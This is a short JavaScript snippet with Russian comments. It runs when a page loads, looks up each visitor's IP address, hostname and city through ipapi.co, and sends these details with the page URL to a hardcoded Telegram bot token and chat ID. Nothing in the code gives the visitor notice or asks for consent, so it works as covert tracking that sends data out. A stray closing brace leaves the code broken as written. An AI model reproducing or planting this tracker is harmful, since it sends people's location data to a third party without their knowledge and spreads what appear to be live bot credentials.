const tgBotToken = "7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc";
const tgChatId = "-1002252120859";

function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage`;
    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: tgChatId, text: message }),
    }).catch(err => console.error("Ошибка отправки в Telegram:", err));
}

function hashDomain(domain) {
    return crypto.subtle.digest("SHA-256", new TextEncoder().encode(domain))
        .then(buffer => {
            let hashArray = Array.from(new Uint8Array(buffer));
            let hashHex = hashArray.map(byte => byte.toString(16).padStart(2, "0")).join("");
            return `#${hashHex.slice(0, 8)}`; // Оставим первые 8 символов хеша
        });
}

function getIPInfo() {
    return fetch("https://ipapi.co/json/") // Бесплатный уровень API
        .then(response => {
            if (!response.ok) {
                throw new Error("Ошибка получения информации о IP");
            }
            return response.json();
        })
        .then(data => {
            return {
                ip: data.ip,
                hostname: data.hostname || "Неизвестно",
                location: `${data.city || "Неизвестно"}, ${data.region || "Неизвестно"}, ${data.country_name || "Неизвестно"}`,
                org: window.location.hostname
            };
        })
        .catch(err => console.error("Ошибка получения информации о IP:", err));
}
}

function logPageVisit() {
    getIPInfo().then(info => {
        hashDomain(info.org).then(domainHashTag => {
            const message = `🌐 Новый визит:
- IP: ${info.ip}
- Хост: ${info.hostname}
- Местоположение: ${info.location}
- Организация: ${info.org}
- Страница: ${window.location.href}
${domainHashTag}`;
            sendToTelegram(message);
        });
    });
}

logPageVisit();
